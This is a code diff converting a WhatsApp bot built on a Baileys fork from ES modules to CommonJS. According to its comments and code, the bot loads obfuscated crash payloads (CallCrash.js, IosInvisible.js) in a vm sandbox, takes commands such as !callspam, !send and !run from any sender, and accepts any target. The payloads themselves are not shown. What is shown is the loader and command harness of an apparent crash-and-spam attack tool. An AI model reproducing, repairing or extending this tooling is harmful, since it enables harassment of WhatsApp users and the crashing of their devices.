@@ -15,10 +15,9 @@
 //   - obfuscated UMD payloads (CallCrash.js, IosInvisible.js) load through a vm sandbox
 //   - commands: !ping | !list | !send | !calltest | !callspam | !run | !help
 //
-// NOTE: package.json sets "type": "commonjs", so either rename this file to
-// bot.mjs (like index.mjs) or set "type": "module" to run it.
+// NOTE: CommonJS (no "type": "module" in package.json), matching cypher-md.
 
-import {
+const {
   makeWASocket,
   useMultiFileAuthState,
   fetchLatestWaWebVersion,
@@ -30,17 +29,15 @@ import {
   proto,
   Browsers,
   DisconnectReason,
-} from '@lordmega/baileys'
-import crypto from 'node:crypto'
-import fs from 'node:fs'
-import path from 'node:path'
-import vm from 'node:vm'
-import { createRequire } from 'node:module'
-import { pathToFileURL } from 'node:url'
-import pino from 'pino'
-import { Boom } from '@hapi/boom'
-import { fileURLToPath } from 'node:url'
-import { useAuthState } from './storage.js'
+} = require('@lordmega/baileys')
+const crypto = require('node:crypto')
+const fs = require('node:fs')
+const path = require('node:path')
+const vm = require('node:vm')
+const { pathToFileURL } = require('node:url')
+const pino = require('pino')
+const { Boom } = require('@hapi/boom')
+const { useAuthState } = require('./storage.js')
 
 process.on('unhandledRejection', (err) => {
   if (err?.message) console.error('[FATAL]', err.message)
@@ -200,61 +197,64 @@ let sock = null
 const payloads = {}
 const routines = {}
 
-const scanDir = path.dirname(fileURLToPath(import.meta.url))
+const scanDir = __dirname
 let ownNames = ['bot.js', 'bot.mjs', 'bot_test.mjs', 'pair.js', 'server.js', 'storage.js']
 
-try {
-  const entries = fs.readdirSync(scanDir, { withFileTypes: true })
-  const jsFiles = entries
-    .filter((e) => e.isFile())
-    .filter((e) => e.name.endsWith('.js'))
-    .filter((e) => !e.name.includes('node_modules'))
-    .filter((e) => !ownNames.some((n) => e.name.toLowerCase() === n))
+;(async () => {
+  try {
+    const entries = fs.readdirSync(scanDir, { withFileTypes: true })
+    const jsFiles = entries
+      .filter((e) => e.isFile())
+      .filter((e) => e.name.endsWith('.js'))
+      .filter((e) => !e.name.includes('node_modules'))
+      .filter((e) => !ownNames.some((n) => e.name.toLowerCase() === n))
 
-  for (const file of jsFiles) {
-    const key = file.name.replace(/\.js$/, '')
-    try {
-      const mod = await import(pathToFileURL(path.join(scanDir, file.name)).href)
-      const def = mod?.default ?? mod
-      if (def && typeof def === 'object' && Object.keys(def).length) {
-        payloads[key] = def
-        console.log(`[load] "${key}" -> payload object`)
-      } else if (typeof def === 'function') {
-        routines[key] = def
-        console.log(`[load] "${key}" -> default function registered`)
-      } else {
-        console.warn(`[load] "${key}" -> no usable default export (skipped)`)
+    for (const file of jsFiles) {
+      const key = file.name.replace(/\.js$/, '')
+      try {
+        const mod = await import(pathToFileURL(path.join(scanDir, file.name)).href)
+        const def = mod?.default ?? mod
+        if (def && typeof def === 'object' && Object.keys(def).length) {
+          payloads[key] = def
+          console.log(`[load] "${key}" -> payload object`)
+        } else if (typeof def === 'function') {
+          routines[key] = def
+          console.log(`[load] "${key}" -> default function registered`)
+        } else {
+          console.warn(`[load] "${key}" -> no usable default export (skipped)`)
+        }
+      } catch (err) {
+        console.warn(`[load] "${key}" failed (${err.message}) — source is not a clean module, using built-in routine`)
       }
-    } catch (err) {
-      console.warn(`[load] "${key}" failed (${err.message}) — source is not a clean module, using built-in routine`)
     }
+  } catch (err) {
+    console.warn(`[load] could not scan folder: ${err.message}`)
   }
-} catch (err) {
-  console.warn(`[load] could not scan folder: ${err.message}`)
-}
 
-// Bonus: pull in payloads.mjs (explicit named export) if present.
-try {
-  const { payloads: extra } = await import(pathToFileURL(path.join(scanDir, 'payloads.mjs')).href)
-  if (extra) {
-    for (const [k, v] of Object.entries(extra)) {
-      payloads[k.replace(/\.js$/, '')] = v
+  // Bonus: pull in payloads.mjs (explicit named export) if present.
+  try {
+    const { payloads: extra } = await import(pathToFileURL(path.join(scanDir, 'payloads.mjs')).href)
+    if (extra) {
+      for (const [k, v] of Object.entries(extra)) {
+        payloads[k.replace(/\.js$/, '')] = v
+      }
+      console.log(`[load] merged ${Object.keys(extra).length} payload(s) from payloads.mjs`)
     }
-    console.log(`[load] merged ${Object.keys(extra).length} payload(s) from payloads.mjs`)
-  }
-} catch { /* optional */ }
+  } catch { /* optional */ }
 
-// ---------------------------------------------------------------------------
-// Optional detection filter (log-only, never blocks or auto-replies).
-// ---------------------------------------------------------------------------
-let scoreMessage = null
-try {
-  const detect = await import('./detect.mjs')
-  scoreMessage = detect.scoreMessage || null
-  console.log('[detect] scoreMessage() loaded from detect.mjs')
-} catch (err) {
-  console.warn(`[detect] detect.mjs not found / no scoreMessage export (${err.message})`)
-}
+  // ---------------------------------------------------------------------------
+  // Optional detection filter (log-only, never blocks or auto-replies).
+  // ---------------------------------------------------------------------------
+  let scoreMessage = null
+  try {
+    const detect = await import('./detect.mjs')
+    scoreMessage = detect.scoreMessage || null
+    console.log('[detect] scoreMessage() loaded from detect.mjs')
+  } catch (err) {
+    console.warn(`[detect] detect.mjs not found / no scoreMessage export (${err.message})`)
+  }
+  global.__scoreMessage = scoreMessage
+})()
 
 // ---------------------------------------------------------------------------
 // ROUTINES — adapted, self-contained copies of every functional script in the
@@ -1514,7 +1514,7 @@ Object.assign(routines, {
 // ---------------------------------------------------------------------------
 // Obfuscated (UMD/Function-constructor) payloads — CallCrash.js, IosInvisible.js
 // ---------------------------------------------------------------------------
-const _req = createRequire(import.meta.url)
+const _req = require
 
 // Runs a UMD-obfuscated module (Function(...)({module,exports,require,...}))
 // in a sandbox and returns its module.exports.
@@ -1950,6 +1950,7 @@ async function onMessages({ messages, type }) {
   const body = normalizedContent?.conversation || normalizedContent?.extendedTextMessage?.text || ''
 
   // Auto-detection: log-only, never blocks or replies.
+  const scoreMessage = global.__scoreMessage || null
   if (scoreMessage && !msg.key.fromMe) {
     try {
       const verdict = scoreMessage(msg.message)
@@ -1984,10 +1985,11 @@ async function onMessages({ messages, type }) {
 
 // ---------------------------------------------------------------------------
 // Session + boot — startBot() auto-starts the legacy flat auth_info/ session
-// only when run directly. When imported by server.js, per-number sessions are
+// only when run directly. When required by server.js, per-number sessions are
 // started explicitly via startBot(phoneNumber).
 // ---------------------------------------------------------------------------
-if (import.meta.main) {
+const isMain = require.main === module
+if (isMain) {
   startBot().catch((err) => {
     console.error('[BOT] start failed:', err.message)
   })
@@ -2004,10 +2006,10 @@ setInterval(async () => {
   }
 }, 25000)
 
-if (import.meta.main) {
+if (isMain) {
   console.log('[bot] unrestricted — any sender can command, any target accepted.')
   console.log(`[bot] loaded ${Object.keys(payloads).length} payload(s), ${Object.keys(routines).length} routine(s).`)
   console.log('[bot] ready. Send !ping from any number to verify.')
 }
 
-export { startBot, connections, sessions, startTime, isConnecting }
+module.exports = { startBot, connections, sessions, startTime, isConnecting }
